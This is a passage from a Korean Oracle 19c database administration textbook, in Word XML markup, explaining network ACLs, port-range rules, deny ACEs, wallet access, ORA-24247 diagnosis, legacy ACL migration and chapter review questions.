        <w:t>4.5.2  포트 범위의 규칙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포트 범위는 connect 계열 권한(http, smtp, connect 등 TCP 연결)에만 의미가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resolve는 포트 범위가 없는 ACL에만 들어갈 수 있다. 포트를 지정해 resolve를 덧붙이면 ORA-24244: invalid host or port for access control list (ACL) assignment가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호스트에 연결되는 포트 범위끼리는 겹칠 수 없다. 8090~8090 범위 ACL이 있는 호스트에 8000~8100 범위로 ACE를 덧붙이면 ORA-24244다.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이미 있는 범위와 똑같은 범위로 주면 그 ACL에 ACE가 추가된다. 범위를 넓히려면 기존 ACE를 지우고 새 범위로 다시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포트를 생략한 ACL은 그 호스트의 모든 포트에 적용된다. 포트 범위가 있는 ACL과 함께 있으면 포트 범위가 있는 쪽이 먼저 판정된다.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host, lower_port lo, upper_port hi, ace_order ord, principal, privilege, grant_type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dba_host_aces WHERE principal LIKE 'ACL%' ORDER BY host, lo, ord;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HOST                     LO         HI        ORD PRINCIPAL  PRIVILEGE GRANT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 ---------- ---------- ---------- --------- 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172.16.225.50          8090       8090          1 ACL_U1     HTTP      GRANT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172.16.225.50          8090       8090          2 ACL_U1     CONNECT   GRANT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oel7v9                                          1 ACL_U1     RESOLVE   GRANT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포트를 하나 더 열어 달라는 요청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8080 포트로 연동하던 업체가 8443을 추가로 쓰게 되어 같은 호스트에 대한 포트를 넓혀 달라는 요청이 왔다. 담당자가 8080~8443 범위로 ACE를 덧붙이려 하자 ORA-24244가 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같은 호스트에 이미 8080~8080 범위의 ACL이 있었고, 새 범위가 그 범위와 겹쳤기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필요한 것은 범위가 아니라 포트 두 개였다. 8443~8443 범위로 따로 덧붙이자 겹치지 않아 정상 등록됐다. 범위를 넓히면 그 사이의 300여 개 포트까지 열리므로, 포트는 실제로 쓰는 것만 하나씩 등록하는 편이 낫다.</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>4.5.3  localhost와 루프백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서버의 서비스를 호출할 때 </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="맑은 고딕"/>
          <w:sz w:val="21"/>
        </w:rPr>
        <w:t>localhost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127.0.0.1</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:hAnsi="맑은 고딕" w:eastAsia="맑은 고딕"/>
          <w:sz w:val="21"/>
        </w:rPr>
        <w:t>, 서버 이름, 서버 IP는 모두 다른 호스트 문자열이다.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설치 직후 localhost에는 ORACLE_OCM 계정의 resolve ACE가 있다. 오라클 구성 관리자용이며 일반 사용자 권한과 관계없다.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로컬 서비스 호출을 허용할 때도 애플리케이션이 실제로 쓰는 문자열 하나만 등록한다. 루프백을 열어 두면 DB 서버에서 도는 관리용 웹 콘솔 등 내부 전용 서비스에 접근할 통로가 된다.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>4.6  판정 순서와 거부 ACE</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>4.6.1  가장 구체적인 호스트부터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사용자가 어떤 호스트에 접속하려 하면 데이터베이스는 그 호스트에 대해 가장 구체적인 ACL부터 차례로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검색 순서는 </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="맑은 고딕"/>
          <w:sz w:val="21"/>
        </w:rPr>
        <w:t>DBMS_NETWORK_ACL_UTILITY.DOMAINS</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:hAnsi="맑은 고딕" w:eastAsia="맑은 고딕"/>
          <w:sz w:val="21"/>
        </w:rPr>
        <w:t>로 볼 수 있다. 172.16.225.50이면 172.16.225.50 → 172.16.225.* → 172.16.* → 172.* → * 순서다.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이름이면 www.us.example.com → *.us.example.com → *.example.com → *.com → * 순서다.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하위 도메인에 할당된 ACL이 상위 도메인의 ACL보다 우선한다. 같은 호스트에서는 포트 범위가 있는 ACL이 포트 범위가 없는 ACL보다 우선한다.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구체적인 ACL에 그 사용자에 대한 판정이 있으면 거기서 끝난다. 판정이 없으면 다음 단계의 ACL로 넘어간다.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column_value AS domain FROM TABLE(DBMS_NETWORK_ACL_UTILITY.DOMAINS('172.16.225.50'));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DOMAIN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172.16.225.50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</w:tc>
      </w:tr>
    </w:tbl>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>4.6.2  거부 ACE 활용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granted =&gt; FALSE로 만든 ACE는 그 주체의 권한을 거부한다.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서브넷 전체를 허용하고 특정 서버만 막는 구성이 대표적이다. </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="맑은 고딕"/>
          <w:sz w:val="21"/>
        </w:rPr>
        <w:t>172.16.225.*</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:hAnsi="맑은 고딕" w:eastAsia="맑은 고딕"/>
          <w:sz w:val="21"/>
        </w:rPr>
        <w:t xml:space="preserve">에 허용, </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="맑은 고딕"/>
          <w:sz w:val="21"/>
        </w:rPr>
        <w:t>172.16.225.50</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:hAnsi="맑은 고딕" w:eastAsia="맑은 고딕"/>
          <w:sz w:val="21"/>
        </w:rPr>
        <w:t>에 거부를 두면 172.16.225.50만 ORA-24247이다.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호스트 단위 거부가 서브넷 허용보다 구체적이라 먼저 판정되기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거꾸로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>에 거부를 두고 특정 호스트에 허용을 두는 구성은 의미가 없다. 기본이 이미 거부이므로 허용만 두면 같은 결과다.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ACL 안에 같은 주체에 대한 허용과 거부를 함께 두면 ACE_ORDER 순서에 따라 결과가 달라질 수 있다. 한 주체·한 호스트에는 한 가지 판정만 둔다.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>4.6.3  사용자가 직접 보는 판정 결과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USER_HOST_ACES는 현재 사용자에게 적용되는 호스트 ACE와 그 판정(GRANTED, DENIED)을 보여 준다. PUBLIC에 열려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ORA-24247을 받은 개발자가 DBA에게 묻기 전에 스스로 어떤 호스트·포트에 어떤 권한이 있는지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역할을 통해 받은 권한도 역할이 켜져 있으면 나타난다.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ACL_U2@orcl&gt; SELECT host, lower_port lo, upper_port hi, privilege, status FROM user_host_aces ORDER BY host;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HOST                     LO         HI PRIVILEGE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 ---------- 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172.16.225.*                           HTTP      GRANTED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172.16.225.50                          HTTP      DENIED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원본의 CHECK_PRIVILEGE 계열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원본 자료는 DBMS_NETWORK_ACL_ADMIN.CHECK_PRIVILEGE와 CHECK_PRIVILEGE_ACLID로 사용자별 판정을 확인한다. 19c에서도 동작하지만 하위 호환용으로만 남은 함수다.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새로 만드는 점검 스크립트는 DBA_HOST_ACES와 USER_HOST_ACES를 기준으로 짠다. 뷰는 주체·권한·포트·허용 여부를 한 번에 보여 줘 점검표로 옮기기 쉽다.</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>4.6.4  판정 사례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등록된 ACE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호출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172.16.225.50:8090 http (U1)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U1, UTL_HTTP http://172.16.225.50:8090/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허용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172.16.225.50:8090 http (U1)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U1, UTL_TCP 172.16.225.50 8090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ORA-24247(connect 아님)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172.16.225.50:8090 http (U1)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U1, UTL_HTTP http://oel7v9:8090/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ORA-24247(호스트 문자열 다름)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172.16.225.50:8090 connect (U1)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U1, UTL_TCP 172.16.225.50 1521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ORA-24247(포트 범위 밖)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172.16.225.* http 허용, 172.16.225.50 http 거부 (U2)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U2, UTL_HTTP http://172.16.225.50:8090/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ORA-24247(구체적 거부 우선)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 R에 http, U3는 R 보유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U3, SET ROLE NONE 후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ORA-24247(역할 꺼짐)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표의 행은 모두 실습 01~04에서 직접 확인한다. 결과가 거부인 행은 원인이 모두 다르다는 점을 진단할 때 떠올린다.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>4.6.5  DBMS_NETWORK_ACL_UTILITY로 우선순위 확인</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:hAnsi="맑은 고딕" w:eastAsia="맑은 고딕"/>
          <w:sz w:val="21"/>
        </w:rPr>
        <w:t>호스트 ACL이 수십 개로 늘면 어느 ACL이 먼저 판정되는지 눈으로 따라가기 어렵다. DBMS_NETWORK_ACL_UTILITY는 판정 순서를 SQL로 재현하는 함수를 제공하며, EXECUTE 권한이 PUBLIC에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함수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반환값(PL/SQL Packages and Types Reference 기준)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DOMAINS(host)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그 호스트의 판정에 쓰이는 호스트·도메인·서브넷 목록. 구체적인 것부터 나옴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DOMAIN_LEVEL(host)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호스트·도메인·서브넷의 단계 수. 클수록 구체적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CONTAINS_HOST(host, domain)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host가 domain에 포함되면 우선순위 값, 포함되지 않으면 NULL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EQUALS_HOST(host1, host2)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두 호스트·도메인·서브넷이 같으면 1, 다르면 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CONTAINS_HOST의 값은 domain 종류에 따라 다르다. 호스트 이름이면 도메인 단계 + 1, 도메인이면 도메인 단계, IP·서브넷이면 유효 주소 비트 수,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>이면 0이다.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값이 클수록 먼저 판정된다. 특정 호스트에 걸리는 ACL을 우선순위 순으로 늘어놓는 조회가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함수 모두 이름 풀이를 하지 않는다. 이름과 IP가 같은 서버를 가리켜도 서로 포함 관계로 보지 않으며, 4.5.1의 판정 규칙과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DOMAINS와 DOMAIN_LEVEL은 IPv6 주소와 CIDR 표기 서브넷을 다루지 못한다고 문서에 적혀 있다. IPv4 표기로 등록한 환경에서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-- 172.16.225.50 호출에 관여하는 ACL을 판정 순서대로(문서 예제 형식)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host, lower_port, upper_port, acl, precedence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(SELECT host, lower_port, upper_port, acl,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DBMS_NETWORK_ACL_UTILITY.CONTAINS_HOST('172.16.225.50', host) AS precedence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FROM dba_host_acls)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precedence IS NOT NULL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precedence DESC, lower_port NULLS LAST;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결과의 첫 행이 가장 먼저 판정되는 ACL이다. 같은 호스트에서 포트 범위가 있는 행을 앞에 두려고 lower_port가 NULL인 행을 뒤로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판정까지 보려면 이 결과의 호스트로 DBA_HOST_ACES를 이어 조회해 주체와 GRANT_TYPE을 확인한다.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>4.7  지갑 접근 제어</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>4.7.1  지갑 ACE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HTTPS 호출에서 클라이언트 인증서를 제시하거나 지갑에 저장된 비밀번호 자격 증명을 쓰려면 지갑에 대한 ACE가 따로 필요하다.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APPEND_WALLET_ACE</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:hAnsi="맑은 고딕" w:eastAsia="맑은 고딕"/>
          <w:sz w:val="21"/>
        </w:rPr>
        <w:t xml:space="preserve">로 지갑 경로에 </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="맑은 고딕"/>
          <w:sz w:val="21"/>
        </w:rPr>
        <w:t>use_client_certificates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use_passwords</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:hAnsi="맑은 고딕" w:eastAsia="맑은 고딕"/>
          <w:sz w:val="21"/>
        </w:rPr>
        <w:t xml:space="preserve"> 권한을 준다. 경로는 </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="맑은 고딕"/>
          <w:sz w:val="21"/>
        </w:rPr>
        <w:t>file:/디렉터리</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:hAnsi="맑은 고딕" w:eastAsia="맑은 고딕"/>
          <w:sz w:val="21"/>
        </w:rPr>
        <w:t xml:space="preserve"> 형식이며 대소문자를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호스트 ACE와 지갑 ACE는 별개다. HTTPS 서버에 접속하려면 호스트 ACE(http 또는 connect)도 함께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조회는 DBA_WALLET_ACLS, DBA_WALLET_ACES, USER_WALLET_ACES로 한다. 지갑의 구조와 생성은 1장(SEPS)과 11장(TLS)에서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DBMS_NETWORK_ACL_ADMIN.APPEND_WALLET_ACE(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wallet_path =&gt; 'file:/u01/app/oracle/admin/orcl/https_wallet',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ace         =&gt; xs$ace_type(privilege_list =&gt; xs$name_list('use_client_certificates'),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principal_name =&gt; 'APP_USER',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   principal_type =&gt; xs_acl.ptype_db));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3"/>
      </w:pPr>
      <w:r>
        <w:t>4.7.2  HTTPS 호출의 구성 요소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UTL_HTTP로 HTTPS URL을 호출하려면 서버 인증서를 검증할 신뢰 인증서(CA 인증서)가 담긴 지갑이 필요하다. 세션에서 </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="맑은 고딕"/>
          <w:sz w:val="21"/>
        </w:rPr>
        <w:t>UTL_HTTP.SET_WALLET</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:hAnsi="맑은 고딕" w:eastAsia="맑은 고딕"/>
          <w:sz w:val="21"/>
        </w:rPr>
        <w:t>으로 지갑 경로를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신뢰 인증서만 쓰는 일반적인 HTTPS 호출에는 호스트 ACE(http, 포트 443)가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상대 서버가 클라이언트 인증서를 요구하는 상호 인증이라면 지갑에 클라이언트 인증서를 넣고 use_client_certificates 지갑 ACE를 추가한다.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지갑에 저장한 사용자 이름·비밀번호로 HTTP 인증을 하려면 use_passwords 지갑 ACE가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지갑 경로를 틀리면 ORA-29248(지갑 열기 실패) 같은 오류가 나고, 신뢰 인증서가 없으면 ORA-29024(인증서 검증 실패)가 난다. 둘 다 ACL과는 다른 단계의 문제다.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DECLARE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 VARCHAR2(4000);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UTL_HTTP.SET_WALLET('file:/u01/app/oracle/admin/orcl/https_wallet');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 := UTL_HTTP.REQUEST('https://pay.example.com/health');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</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>4.8  오류와 진단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ORA-24247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ACL이 접속을 허용하지 않음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USER_HOST_ACES, 호출에 쓴 호스트 문자열, 역할 활성화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ORA-29273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UTL_HTTP 요청 실패(겉 오류)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아래 줄의 실제 원인(ORA-24247, ORA-12541 등)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ORA-24244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잘못된 호스트·포트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resolve에 포트 지정, 포트 범위 겹침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ORA-01927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없는 ACE 제거 시도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추가할 때와 같은 호스트·포트·권한·granted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ORA-46212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이름의 ACL 재생성(구버전 API)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DBA_HOST_ACLS의 기존 ACL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ORA-46114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없는 ACL 이름(구버전 API)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/sys/acls/ 이름 철자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ORA-24247을 받으면 먼저 호출한 사용자로 USER_HOST_ACES를 본다. 원하는 호스트·포트·권한이 GRANTED로 있는지가 첫 확인 사항이다.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행이 보이는데도 거부되면 호스트 문자열(이름과 IP), 포트, 권한 종류(http인데 UTL_TCP를 쓰는지)를 차례로 맞춰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프로시저 안에서만 실패하면 역할로 받은 권한인지 확인한다. 정의자 권한 프로시저에서는 역할이 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ACL이 통과된 뒤의 실패는 네트워크 문제다. ORA-12541, ORA-12535 같은 연결 오류는 대상 서버, 방화벽, 포트 상태를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특정 사용자에게 실제로 적용되는 호스트 ACE를 DBA가 확인하려면 사용자 자신과 그 사용자가 받은 역할을 주체로 하는 ACE를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a.host, a.lower_port, a.upper_port, a.principal, a.privilege, a.grant_type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dba_host_aces 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a.principal = 'APP_USER'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OR a.principal IN (SELECT granted_role FROM dba_role_privs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START WITH grantee = 'APP_USER'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CONNECT BY PRIOR granted_role = grantee)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ORDER BY a.host, a.lower_port;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역할 계층을 따라 내려가므로 역할 안의 역할로 받은 권한도 나온다. 다만 세션에서 그 역할이 실제로 켜져 있는지는 이 조회로 알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ORA-24247 진단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호출한 사용자로 접속해 USER_HOST_ACES를 조회한다. 행이 없으면 ACE가 없는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호출 코드가 쓰는 호스트 문자열과 포트를 확인해 USER_HOST_ACES의 HOST, LOWER_PORT, UPPER_PORT와 맞춘다.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사용하는 패키지와 권한 종류를 맞춘다. UTL_TCP·DBMS_LDAP는 connect, UTL_INADDR는 resolve가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프로시저 안에서만 실패하면 정의자 권한 프로시저에서 역할이 꺼진 것인지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STATUS가 DENIED인 행이 있으면 더 구체적인 호스트에 거부 ACE가 있는 것이다.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배치 메일이 어느 날부터 발송되지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야간 배치가 끝나면 UTL_MAIL로 결과 메일을 보내던 시스템이 DB 업그레이드 이후 메일을 보내지 않았다. 배치 로그에는 ORA-24247이 남아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업그레이드 전 DB는 10g였고 당시에는 ACL이라는 개념이 없었다. 업그레이드 후 네트워크 접근이 기본 거부로 바뀌면서 메일 서버 접속이 막힌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배치 계정에 메일 서버 호스트, 포트 25로 smtp 권한 ACE를 추가했다. connect가 아니라 smtp만 준 덕분에 같은 계정이 메일 서버의 다른 포트로 접속하는 일은 여전히 막혀 있다.</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>4.9  네트워크 ACL 관련 데이터 딕셔너리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DBA_HOST_ACLS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호스트·포트 범위별로 할당된 ACL. SELECT_CATALOG_ROLE 필요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DBA_HOST_ACES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호스트별 ACE. 주체, 권한, GRANT_TYPE(GRANT·DENY), ACE_ORDER, 유효 기간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USER_HOST_ACES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현재 사용자에게 적용되는 호스트 권한과 판정(GRANTED·DENIED). PUBLIC 조회 가능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DBA_WALLET_ACLS, DBA_WALLET_ACES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지갑 경로별 ACL과 ACE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USER_WALLET_ACES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현재 사용자의 지갑 권한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DBA_NETWORK_ACLS, DBA_NETWORK_ACL_PRIVILEGES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11g 호환 뷰. 구버전 API로 만든 ACL 이름(/sys/acls/...)을 보여 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host, lower_port lo, upper_port hi, acl FROM dba_network_acls WHERE acl LIKE '%legacy%';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HOST                   LO         HI ACL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---------- ---------- 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oel7v9               8090       8090 /sys/acls/acl_legacy.xml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host, lower_port lo, ace_order ord, principal, privilege, grant_type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dba_host_aces WHERE host = 'oel7v9';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HOST                   LO        ORD PRINCIPAL  PRIVILEGE GRANT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---------- ---------- ---------- --------- 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oel7v9                             1 ACL_U1     RESOLVE   GRANT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oel7v9               8090          1 ACL_U3     CONNECT   GRANT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구버전 API로 만든 ACL도 DBA_HOST_ACES에서는 새 방식의 ACE와 같은 형식으로 보인다. 호스트 이름은 소문자로 저장되므로 조회 조건도 소문자로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정기 점검은 DBA_HOST_ACES 하나로 대부분 해결된다. 호스트, 포트, 주체, 권한, 허용 여부를 한 행에 담는다.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주체가 역할이면 DBA_ROLE_PRIVS로 그 역할을 가진 사용자를 이어서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설치 직후부터 있는 ACE(예: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>에 대한 GSMADMIN_INTERNAL·GGSYS의 resolve, localhost에 대한 ORACLE_OCM의 resolve)는 오라클 내부 구성 요소용이다. 점검에서 제외하고 지우지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SYS@orcl&gt; SELECT host, NVL(TO_CHAR(lower_port), '-') || '~' || NVL(TO_CHAR(upper_port), '-') AS ports,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principal, privilege, grant_type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dba_host_aces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WHERE principal NOT IN ('GSMADMIN_INTERNAL', 'GGSYS', 'ORACLE_OCM')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ORDER BY principal, host;</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>4.10  설계와 적용 절차</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>4.10.1  도입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확인할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외부 호출 목록 작성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호출 패키지, URL의 호스트 문자열, 포트, 호출 계정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주체 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애플리케이션 계정 또는 역할. 정의자 권한 프로시저면 소유자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권한 결정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http·smtp 우선, connect는 UTL_TCP·DBMS_LDAP가 필요할 때만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APPEND_HOST_ACE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호스트는 구체적으로, 포트는 실제 포트만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업무 계정으로 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USER_HOST_ACES, 실제 호출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거부 시험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포트·다른 호스트·다른 계정이 막히는지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점검 목록 등록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DBA_HOST_ACES 정기 점검, 유효 기간 만료 항목 정리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6단계를 빼먹기 쉽다. 허용이 잘 되는 것만 보고 끝내면 와일드카드나 connect로 지나치게 넓게 연 것을 알아채지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외부 호출 목록은 애플리케이션 소스에서 UTL_HTTP, UTL_SMTP, UTL_TCP, UTL_MAIL, DBMS_LDAP, HttpUriType을 검색해 만든다. DBA_DEPENDENCIES에서 이 패키지를 참조하는 객체를 찾으면 DB 안의 호출 지점이 빠짐없이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호출 지점마다 호스트를 상수로 쓰는지, 설정 테이블에서 읽는지도 함께 적는다. 설정 테이블에서 읽는 코드는 테이블 값이 바뀌면 ACL도 함께 바꿔야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업무 담당자가 ACL 등록을 요청할 때 1단계 항목을 채워 내도록 양식을 만든다. 호스트 문자열을 이름으로 쓸지 IP로 쓸지는 요청 단계에서 정한다.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>4.10.2  구버전 ACL을 새 API로 옮기기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11g 시절 만든 ACL이 남아 있는 DB는 DBA_NETWORK_ACLS에 /sys/acls/이름.xml 형식의 ACL이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옮기는 순서는 기존 ACE 확인, 새 API로 같은 권한 등록, 업무 계정 시험, 구버전 ACL 삭제다.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새 API로 같은 호스트·같은 포트 범위에 덧붙이면 기존 ACL에 ACE가 추가될 수 있다. 구버전 ACL을 지우기 전에 DBA_HOST_ACES에서 새 ACE만으로 필요한 권한이 모두 남는지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DROP_ACL은 하위 호환용으로 남아 있어 구버전 ACL 정리에 그대로 쓸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-- 1) 구버전 ACL의 내용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acl, principal, privilege, is_grant FROM dba_network_acl_privileges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acl LIKE '/sys/acls/%';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host, lower_port, upper_port, acl FROM dba_network_acls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acl LIKE '/sys/acls/%';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-- 2) 같은 권한을 새 API로 등록한 뒤 업무 계정으로 시험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-- 3) 구버전 ACL 삭제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 DBMS_NETWORK_ACL_ADMIN.DROP_ACL('test_acl_file.xml')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설치 때 오라클이 만든 /sys/acls/oracle-sysman-ocm-Resolve-Access.xml 같은 ACL은 옮기거나 지우지 않는다.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>4.11  운영 시 주의점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>에 일반 사용자 권한을 주지 않는다. 모든 외부 호스트로 나갈 수 있는 통로가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업체 서버의 IP가 바뀌면 IP로 등록한 ACE는 조용히 무효가 된다. 연동 업체의 주소 변경 공지를 받는 경로를 운영 절차에 넣고, 가능하면 업체가 보장하는 도메인 이름으로 등록한다.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업그레이드, 다른 DB로의 이관 뒤에는 DBA_HOST_ACES를 원본과 비교한다. Data Pump 전체 이관에서 ACL이 기대와 다르게 옮겨지는 경우가 있어 이관 후 점검 항목에 넣는다.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구버전 API로 만든 ACL과 새 API로 만든 ACE가 같은 호스트에 섞여 있으면 관리가 어렵다. 새 API로 다시 등록한 뒤 구버전 ACL은 DROP_ACL로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 서버의 OS 방화벽과 네트워크 장비 방화벽이 ACL과 별개로 존재한다. ACL이 허용해도 방화벽이 막으면 ORA-12535 같은 연결 오류가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ACL 변경은 즉시 반영되고 감사 기록이 남지 않는 구성이 많다. DBMS_NETWORK_ACL_ADMIN 호출을 Unified Auditing 정책으로 기록한다(13장).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개발 DB에서 편의상 </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="맑은 고딕"/>
          <w:sz w:val="21"/>
        </w:rPr>
        <w:t>*</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:hAnsi="맑은 고딕" w:eastAsia="맑은 고딕"/>
          <w:sz w:val="21"/>
        </w:rPr>
        <w:t>에 connect를 열어 둔 설정이 운영 DB로 복제되지 않도록, 운영 반영 스크립트에 ACL 항목을 따로 관리한다.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유효 기간을 둔 ACE는 기간이 지나도 행이 남는다. END_DATE가 지난 행을 정기적으로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계정 삭제 절차에 "해당 계정이 주체인 ACE를 remove_empty_acl =&gt; TRUE로 먼저 제거"를 넣는다. 순서를 거꾸로 하면 빈 ACL이 남는다(4.3.5).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DBA_HOST_ACLS에는 있는데 DBA_HOST_ACES에 그 호스트의 행이 없으면 빈 ACL이다. 점검 조회에 포함해 SET_HOST_ACL(acl =&gt; NULL)로 정리한다.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실습에서 띄운 시험용 HTTP 서버와 ACE는 실습 05에서 모두 철거한다.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>4.12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UTL_HTTP, UTL_TCP, UTL_SMTP, UTL_MAIL, UTL_INADDR, DBMS_LDAP, HttpUriType은 PUBLIC 실행 권한이 있어도 네트워크 ACL이 허용해야 외부에 접속한다. 허용이 없으면 ORA-24247이다.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19c에서는 </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="맑은 고딕"/>
          <w:sz w:val="21"/>
        </w:rPr>
        <w:t>APPEND_HOST_ACE</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:hAnsi="맑은 고딕" w:eastAsia="맑은 고딕"/>
          <w:sz w:val="21"/>
        </w:rPr>
        <w:t xml:space="preserve">로 호스트(와 포트 범위)에 ACE를 덧붙이고 </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="맑은 고딕"/>
          <w:sz w:val="21"/>
        </w:rPr>
        <w:t>REMOVE_HOST_ACE</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:hAnsi="맑은 고딕" w:eastAsia="맑은 고딕"/>
          <w:sz w:val="21"/>
        </w:rPr>
        <w:t>로 뺀다. ACL은 자동으로 만들어지고, remove_empty_acl =&gt; TRUE면 빈 ACL도 지워진다.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ACE는 XS$ACE_TYPE으로 만들며 principal_type =&gt; xs_acl.ptype_db를 반드시 적는다. granted =&gt; FALSE면 거부 ACE다.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권한은 http, http_proxy, smtp, connect, resolve, jdwp. connect가 가장 넓으므로 용도별 권한을 우선한다.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포트 범위는 TCP 연결 권한에만 쓰고, resolve는 포트 없는 ACL에만 들어간다. 같은 호스트의 포트 범위는 겹칠 수 없다(ORA-24244).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판정은 가장 구체적인 호스트, 같은 호스트에서는 포트 범위가 있는 ACL부터 한다. 이 순서를 이용해 넓게 허용하고 일부를 거부할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CREATE_ACL·ASSIGN_ACL 등 구버전 API는 디프리케이트됐지만 동작하며, 결과는 DBA_HOST_ACLS·DBA_HOST_ACES에 함께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점검은 DBA_HOST_ACES와 USER_HOST_ACES로 한다. 역할 ACE는 역할이 켜진 세션에서만 유효하다.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>4.13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UTL_HTTP의 EXECUTE 권한이 PUBLIC에 있는 상태에서 ACE가 하나도 없는 사용자가 외부 URL을 호출했다.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정상 응답을 받는다  ② ORA-29273과 ORA-24247이 난다  ③ ORA-01031이 난다  ④ ORA-24244가 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실행 권한은 패키지 호출만 허용한다. 실제 접속은 네트워크 ACL이 판정하며 기본은 거부이므로 ORA-29273 아래에 ORA-24247이 나온다.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HTTP 호출만 하는 애플리케이션 계정에 주기에 가장 알맞은 권한은?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connect  ② resolve  ③ jdwp  ④ http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http는 UTL_HTTP와 HttpUriType의 요청만 허용한다. connect를 주면 같은 호스트·포트로 UTL_TCP 원시 연결까지 열려 필요 이상으로 넓어진다.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APPEND_HOST_ACE로 resolve 권한을 주면서 lower_port =&gt; 8090을 지정했다. 결과는?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ORA-24244가 난다  ② 8090 포트에 대해서만 이름 풀이가 허용된다  ③ 포트 인자가 무시되고 등록된다  ④ ORA-24247이 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resolve는 포트 범위가 없는 ACL에만 넣을 수 있다. 포트를 지정하면 ORA-24244: invalid host or port for access control list (ACL) assignment가 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172.16.225.*에 사용자 A의 http 허용 ACE가 있고, 172.16.225.50에 사용자 A의 http 거부 ACE가 있다. A가 http://172.16.225.50:8090/을 호출하면?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서브넷 허용이 먼저라 성공한다  ② 두 ACE가 충돌해 ORA-24244가 난다  ③ 더 구체적인 호스트의 거부가 먼저 판정되어 ORA-24247이 난다  ④ 포트가 없어 둘 다 무시된다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판정은 가장 구체적인 호스트부터 한다. 172.16.225.50 ACL에 A에 대한 거부가 있으므로 서브넷 허용까지 가지 않는다.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IP 172.16.225.50에 http ACE를 받은 